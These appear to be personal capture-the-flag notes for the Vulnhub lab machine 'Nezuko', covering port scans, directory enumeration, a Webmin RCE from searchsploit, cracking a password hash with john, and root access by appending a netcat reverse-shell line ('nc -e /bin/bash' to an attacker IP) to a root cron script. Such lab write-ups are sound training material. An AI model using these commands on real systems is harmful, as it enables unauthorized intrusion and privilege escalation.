
---

**S1REN's Template Reference**

Vulnhub URL: https://www.vulnhub.com/entry/nezuko-1,352/
\[OS]: 
\[Web-Technology]: Apache 2.4.29
\[Hostname]:  Nezuko
\[IP]:  192.168.56.105
\[USERS]:   nezuko, zenitsu
\[CREDENTIALS]:   zenitsu :: meowmeow

---
\[To-Try LIST]:  
80 - Apache 2.2.49 

13337 - MiniServ 1.920 (Webmin httpd)

22 - ssh - requires credentials

---
\[NMAP RESULTS]:  

PORT      STATE SERVICE  VERSION
**22**/tcp    open  **ssh**      **OpenSSH 7.6p1** Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:f5:b3:ff:35:a8:c8:24:42:66:64:a4:4b:da:b0:16 (RSA)
|   256 2e:0d:6d:5b:dc:fe:25:cb:1b:a7:a0:93:20:3a:32:04 (ECDSA)
|_  256 bc:28:8b:e4:9e:8d:4c:c6:42:ab:0b:64:ea:8f:60:41 (ED25519)
**80**/tcp    open  http     **Apache httpd 2.4.29** ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to my site! - **nezuko kamado**
**13337** /tcp open  ssl/http **MiniServ 1.920 (Webmin httpd)**
| **http-robots.txt: 1 disallowed entry** 
|_/
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on ubuntu
| Not valid before: 2019-08-20T09:28:46
|_Not valid after:  2024-08-18T09:28:46
|_http-title: **Login to Webmin**
|_**ssl-date:** TLS randomness does not represent time

--- 

\[Web Services Enumeration]:   

**Port 80**

View Page Source -> Nothing
```bash
 gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 30 
 
 
 /sample -> nothing_here.txt # real red herring
 /server-status 403
 
 
 
```

 **Port 13337**
 Cannot connect - note it is running ssl/tls needs https
 ```bash
gobuster dir -u $URL:13337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 30 --exclude-length 4603

searchsploit webmin 1.92
# RCE 47293
searchsploit -m 47293

#Modified script to run nc to attacker machine


 ```
**![[Pasted image 20251101074918.png]]**
![[Pasted image 20251101074945.png]]

---


\[OTHER / PRIVILEGE-ESCALATION]:   

```bash
# Establish tty
python3 -c 'import pty; pty.spawn("/bin/bash")' # and other cmds
whoami #nezuko

ls /home #nezuko and zenitsu

cat /nezuko/nezuko.txt  #found flag
Congrats 1af0941e0c4bd4564932184d47dd8bef

nezuko@ubuntu:/home/zenitsu$ cat zenitsu.txt 
Kaminari no kokyū, Ichi no kata...., Hekireki Issen!
3f2ada6791f96b6a50a9ee43ee6b62df


cat /home/zenitsu/to_nezuko/send_message_to_nezuko.sh

nezuko@ubuntu:/home/zenitsu/to_nezuko$ cat send_message_to_nezuko.sh 
#!/bin/bash
date=$(date '+%d-%m-%Y_%H:%M')
echo "nezuko chan, would you like to go on a date with me? " > /home/nezuko/from_zenitsu/new_message_$date
nezuko@ubuntu:/home/zenitsu/to_nezuko$ ls -l
total 4
-rw-r--r-- 1 zenitsu root 150 Aug 21  2019 send_message_to_nezuko.sh

# Checking nezuko/from_zenitsu it is clear there is a cron job running this .sh regularly - it is also running as root:root!!! If we can modify we can get root to run this

#Found nezuko private key

#Hashes inside passwd file?
/etc/passwd:zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0:1001:1001:,,,:/home/zenitsu:/bin/bash 

echo 'zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0' > zenitsu.hash


john --wordlist=/usr/share/wordlists/rockyou.txt zenitsu.hash 
meowmeow


su zenitsu
sudo -l #nothing

# Now we are zenitsu - we can modify send

which nc #installed

echo 'nc -e /bin/bash 192.168.56.101 7777' >> send_message_to_nezuko.sh 


# On host
nc -nlvp 7777

```
![[Pasted image 20251101082516.png]]

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
